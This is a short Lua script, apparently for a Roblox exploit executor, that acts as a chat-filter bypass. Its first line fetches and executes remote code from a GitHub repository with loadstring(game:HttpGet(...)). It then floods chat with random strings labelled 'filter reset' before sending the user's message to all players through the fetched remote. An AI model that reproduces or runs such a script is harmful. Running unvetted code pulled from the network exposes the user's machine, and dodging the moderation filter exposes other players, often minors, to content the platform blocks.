local Connection, Remote = loadstring(game:HttpGet("https://raw.githubusercontent.com/PeaPattern/legacy-hook/main/main.lua"))()
local Players = game:GetService("Players")

local RNG = function(Length)
    local Chars = {}
    for i=97,122 do Chars[#Chars+1]=string.char(i) end
    for i=65,90 do Chars[#Chars+1]=string.char(i) end
    
    local Str = ""
    for i = 1, Length do
        Str = Str .. Chars[math.random(#Chars)]
    end
    return Str
end

Connection.OnInvoke = function(Message)
    for i = 1, 5 do Players:Chat(RNG(30) .. " filter reset with chat function") end
    Remote:FireServer(string.format("%s", Message), "All")
end
